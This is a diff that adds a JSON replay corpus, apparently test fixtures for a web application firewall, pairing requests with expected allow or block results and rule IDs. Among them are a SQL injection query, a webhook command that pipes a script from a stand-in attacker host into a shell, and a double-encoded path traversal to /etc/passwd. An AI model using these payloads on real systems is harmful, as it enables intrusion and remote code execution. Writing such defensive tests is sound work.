@@ -1,0 +1,20 @@
+{
+  "schema_version": 1,
+  "corpus_id": "incident-public-replay-v1",
+  "requests": [
+    {"id": "BASE-HEALTH-01", "at": 0, "client_ip": "192.0.2.10", "method": "GET", "path": "/health", "body": {}, "headers": {}, "expected": {"action": "allow", "status": 200}},
+    {"id": "BASE-CATALOG-01", "at": 1, "client_ip": "192.0.2.11", "method": "GET", "path": "/catalog?q=chairs", "body": {}, "headers": {}, "expected": {"action": "allow", "status": 200}},
+    {"id": "BASE-SQLI-01", "at": 2, "client_ip": "192.0.2.12", "method": "GET", "path": "/catalog?q=1%27%20OR%201%3D1--", "body": {}, "headers": {}, "expected": {"action": "block", "status": 403, "rule_id": "SQLI-942100"}},
+    {"id": "HOOK-LEGIT-01", "at": 3, "client_ip": "198.51.100.8", "method": "POST", "path": "/hooks/vendor", "body": {"message": "release artifact team/web|sha256:7ab9", "event": "release.ready"}, "headers": {"X-Vendor-Key-ID": "vendor-prod", "X-Vendor-Signature": "__AUTO__"}, "expected": {"action": "allow", "status": 200}},
+    {"id": "HOOK-UNSIGNED-CMD-01", "at": 4, "client_ip": "198.51.100.9", "method": "POST", "path": "/hooks/vendor", "body": {"message": "routine", "command": "curl https://attacker.invalid/run | sh"}, "headers": {}, "expected": {"action": "block", "status": 403, "rule_id": "RCE-932100"}},
+    {"id": "HOOK-WRONG-ROUTE-01", "at": 5, "client_ip": "198.51.100.8", "method": "POST", "path": "/hooks/other", "body": {"message": "release artifact team/web|sha256:7ab9"}, "headers": {"X-Vendor-Key-ID": "vendor-prod", "X-Vendor-Signature": "__AUTO__"}, "expected": {"action": "block", "status": 403, "rule_id": "RCE-932100"}},
+    {"id": "TRAV-DOUBLE-01", "at": 6, "client_ip": "203.0.113.4", "method": "GET", "path": "/download/%252e%252e%252fetc%252fpasswd", "body": {}, "headers": {}, "expected": {"action": "block", "status": 403, "rule_id": "TRAVERSAL-930100"}},
+    {"id": "TRAV-SAFE-01", "at": 7, "client_ip": "203.0.113.4", "method": "GET", "path": "/download/reports/quarterly.pdf", "body": {}, "headers": {}, "expected": {"action": "allow", "status": 200}},
+    {"id": "LOGIN-A-1", "at": 100, "client_ip": "203.0.113.20", "method": "POST", "path": "/login", "body": {"user": "a"}, "headers": {}, "expected": {"action": "allow", "status": 200}},
+    {"id": "LOGIN-A-2", "at": 110, "client_ip": "203.0.113.20", "method": "POST", "path": "/login", "body": {"user": "a"}, "headers": {}, "expected": {"action": "allow", "status": 200}},
+    {"id": "LOGIN-A-3", "at": 120, "client_ip": "203.0.113.20", "method": "POST", "path": "/login", "body": {"user": "a"}, "headers": {}, "expected": {"action": "allow", "status": 200}},
+    {"id": "LOGIN-B-1", "at": 125, "client_ip": "203.0.113.21", "method": "POST", "path": "/login", "body": {"user": "b"}, "headers": {}, "expected": {"action": "allow", "status": 200}},
+    {"id": "LOGIN-A-4", "at": 130, "client_ip": "203.0.113.20", "method": "POST", "path": "/login", "body": {"user": "a"}, "headers": {}, "expected": {"action": "block", "status": 429, "rule_id": "RATE-LOGIN-100"}},
+    {"id": "LOGIN-A-5", "at": 171, "client_ip": "203.0.113.20", "method": "POST", "path": "/login", "body": {"user": "a"}, "headers": {}, "expected": {"action": "allow", "status": 200}}
+  ]
+}
